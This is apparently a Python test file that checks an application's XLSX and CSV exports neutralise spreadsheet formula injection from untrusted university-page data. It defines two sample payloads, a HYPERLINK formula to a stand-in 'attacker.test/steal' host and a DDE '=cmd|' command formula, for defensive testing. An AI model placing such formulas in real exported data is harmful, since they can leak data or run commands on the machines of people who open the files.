"""No cell in any exported worksheet may execute.

The shortlist sheet was neutralised; Evidence and Open questions were not, and
they carry the values most directly copied from untrusted university pages —
claim values, verbatim excerpts, source URLs, conflict subjects and the text of
open questions.

Checking that a cell's *string* does not begin with "=" is not enough. The test
that matters is what OpenPyXL stored: a cell whose `data_type` is "f" is a
formula, and Excel will run it.
"""

from __future__ import annotations

import csv
import io
from datetime import UTC, datetime

import openpyxl
import pytest

from app.domain.enums import (
    ClaimStatus,
    ClaimType,
    DocumentOwner,
    DocumentPurpose,
    SourceSpecificity,
)
from app.export.tabular import to_csv, to_xlsx
from app.schemas.claim import ClaimOut
from app.schemas.result import (
    Conflict,
    DocumentChecklist,
    DocumentItem,
    ProgramResult,
    Scholarship,
    UnresolvedQuestion,
)

PAYLOAD = '=HYPERLINK("http://attacker.test/steal","Click")'
DDE = "=cmd|'/c calc'!A0"
LEADERS = ("=", "+", "-", "@", "\t", "\r")


def poisoned_result() -> ProgramResult:
    """One result with the payload in every field an export reads."""
    claim = ClaimOut(
        id="c1",
        claim_type=ClaimType.SCHOLARSHIP_EXISTS,
        normalized_value=PAYLOAD,
        original_text_excerpt=PAYLOAD,
        # `source_url` is schema-validated to be http(s) or fixture://, so a
        # formula cannot reach it. That guard is real and is left in place.
        source_url="https://uni.edu/scholarships",
        accessed_at=datetime.now(UTC),
        status=ClaimStatus.VERIFIED_CURRENT,
        source_specificity=SourceSpecificity.PROGRAM,
    )
    return ProgramResult(
        id="r1", run_id="run1",
        university=PAYLOAD, university_id="u1", country=PAYLOAD, city=PAYLOAD,
        program=PAYLOAD, degree="bachelor", intake=PAYLOAD,
        career_notes=DDE,
        claims=[claim],
        conflicts=[Conflict(
            subject=PAYLOAD, claim_type=ClaimType.SCHOLARSHIP_EXISTS,
            claim_ids=["c1"], values=[PAYLOAD, DDE],
            source_urls=["https://uni.edu/a", "https://uni.edu/b"],
            resolution_rule=PAYLOAD, question_for_admissions=DDE,
        )],
        unresolved=[UnresolvedQuestion(topic=PAYLOAD, question=PAYLOAD,
                                       why_it_matters=DDE, blocking=True)],
        scholarships=[Scholarship(id="s1", name=PAYLOAD, classification_reason=PAYLOAD)],
        checklist=DocumentChecklist(
            result_id="r1", university=PAYLOAD, program=PAYLOAD,
            admission_documents=[DocumentItem(
                name=PAYLOAD, purpose=DocumentPurpose.ADMISSION,
                owner=DocumentOwner.APPLICANT, format_notes=DDE,
            )],
        ),
    )


def offending_cells(book: openpyxl.Workbook) -> list[tuple[str, str, object]]:
    """Cells OpenPyXL stored as formulas, which is what Excel will execute."""
    out = []
    for sheet in book.worksheets:
        for row in sheet.iter_rows():
            for cell in row:
                if cell.data_type == "f" or (isinstance(cell.value, str) and cell.value.startswith(LEADERS)):
                    out.append((sheet.title, cell.coordinate, cell.value))
    return out


class TestEveryWorksheet:
    def test_no_cell_in_any_sheet_is_stored_as_a_formula(self):
        book = openpyxl.load_workbook(io.BytesIO(to_xlsx([poisoned_result()])))
        offenders = [o for o in offending_cells(book) if not str(o[2]).startswith("# ")]
        assert not offenders, (
            "executable cells found:\n  "
            + "\n  ".join(f"{s}!{c} = {v!r}" for s, c, v in offenders)
        )

    def test_all_three_sheets_are_present_and_populated(self):
        """A guard that passes because a sheet is empty proves nothing."""
        book = openpyxl.load_workbook(io.BytesIO(to_xlsx([poisoned_result()])))
        titles = [s.title for s in book.worksheets]
        assert {"Shortlist", "Evidence", "Open questions"} <= set(titles), titles
        for title in ("Evidence", "Open questions"):
            assert book[title].max_row >= 2, f"{title} has only a header row"

    @pytest.mark.parametrize("sheet", ["Shortlist", "Evidence", "Open questions"])
    def test_each_sheet_individually(self, sheet):
        book = openpyxl.load_workbook(io.BytesIO(to_xlsx([poisoned_result()])))
        offenders = [
            (c.coordinate, c.value) for row in book[sheet].iter_rows() for c in row
            if c.data_type == "f"
            or (isinstance(c.value, str) and c.value.startswith(LEADERS)
                and not c.value.startswith("# "))
        ]
        assert not offenders, f"{sheet}: {offenders}"

    def test_the_payload_text_is_still_readable(self):
        """Neutralising must not destroy the evidence a reader needs."""
        book = openpyxl.load_workbook(io.BytesIO(to_xlsx([poisoned_result()])))
        text = " ".join(
            str(c.value) for s in book.worksheets for row in s.iter_rows()
            for c in row if c.value is not None
        )
        assert "attacker.test/steal" in text


class TestCsvToo:
    def test_no_csv_cell_starts_a_formula(self):
        rows = list(csv.reader(io.StringIO(to_csv([poisoned_result()]))))
        offenders = [
            c for row in rows for c in row
            if c.startswith(LEADERS) and not c.startswith("# ")
        ]
        assert not offenders, offenders


class TestRealNumbersSurvive:
    @pytest.mark.parametrize("value", ["-1500", "-1500.50", "-0.5"])
    def test_a_negative_number_is_not_mangled(self, value):
        from app.export.tabular import neutralise_formula

        assert neutralise_formula(value) == value

    def test_json_is_not_a_spreadsheet_and_is_left_alone(self):
        """JSON has no formula semantics; escaping it would corrupt the data."""
        import json

        from app.export.tabular import to_json

        payload = json.loads(to_json([poisoned_result()]))
        assert payload["results"][0]["university"] == PAYLOAD


class TestTheBoundaryIsStructural:
    """A convention that every sheet "remembers" to escape is how this
    happened: the shortlist was neutralised and the other two sheets were not.

    This test reads the export module and fails if a worksheet append carries
    anything but literal header text or a `safe_cells(...)` call.
    """

    @staticmethod
    def appends() -> list[tuple[int, str]]:
        import ast
        import inspect

        import app.export.tabular as module

        source = inspect.getsource(module)
        tree = ast.parse(source)
        out = []
        for node in ast.walk(tree):
            if (
                isinstance(node, ast.Call)
                and isinstance(node.func, ast.Attribute)
                and node.func.attr == "append"
                and node.args
            ):
                out.append((node.lineno, ast.dump(node.args[0])))
        return out

    def test_every_worksheet_append_goes_through_the_boundary(self):
        """No exceptions, not even for our own headers.

        An allowlist for "text we wrote ourselves" is another convention to
        remember, and forgetting one is what caused this. Escaping a constant
        is a no-op, so the rule costs nothing and leaves nothing to judge.
        """
        offenders = [
            lineno for lineno, dumped in self.appends() if "safe_cells" not in dumped
        ]
        assert not offenders, (
            f"worksheet appends bypassing safe_cells() at lines {offenders} of "
            "app/export/tabular.py"
        )

    def test_safe_cells_leaves_non_strings_alone(self):
        """A number or date must keep its type in the workbook."""
        from datetime import date

        from app.export.tabular import safe_cells

        assert safe_cells([1, 2.5, None, True, date(2027, 1, 1)]) == [
            1, 2.5, None, True, date(2027, 1, 1),
        ]

    def test_safe_cells_escapes_every_dangerous_leader(self):
        from app.export.tabular import safe_cells

        for leader in ("=", "+", "@", "\t", "\r"):
            out = safe_cells([f"{leader}danger"])[0]
            assert not out.startswith(LEADERS), f"{leader!r} survived: {out!r}"
